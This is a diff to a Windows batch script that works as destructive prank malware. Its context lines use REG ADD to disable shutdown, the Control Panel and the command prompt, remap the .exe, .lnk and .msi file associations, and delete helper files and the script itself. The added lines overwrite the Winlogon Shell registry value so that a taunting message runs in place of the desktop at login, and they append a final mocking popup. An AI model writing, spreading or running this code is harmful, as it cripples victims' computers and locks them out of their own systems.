@@ -15,7 +15,7 @@ REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Ex
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoClose" /t REG_DWORD /d 1 /f
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoControlPanel" /t REG_DWORD /d 1 /f
 REG ADD "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 1 /f
-
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d  "cmd.exe /c msg * hahahahahaha" /f
 
 assoc .lnk=.gif
 assoc .exe=.lnk
@@ -30,4 +30,4 @@ assoc .msi=.lnk
 del kill.vbs
 del kill.jpg
 del %0
-
+msg * HAHAHAHAHAHAHAHA
